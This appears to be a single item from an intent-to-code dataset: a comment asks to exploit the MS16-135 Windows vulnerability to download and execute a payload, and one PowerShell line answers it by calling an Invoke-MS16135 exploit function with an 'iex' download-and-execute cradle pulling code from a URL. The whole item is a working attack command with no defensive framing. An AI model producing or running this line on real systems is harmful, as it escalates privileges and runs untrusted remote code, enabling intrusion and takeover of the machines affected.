# Natural language intent:
# Invoke MS16-135 vulnerability to download and execute a payload from a specified URL.

Invoke-MS16135 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
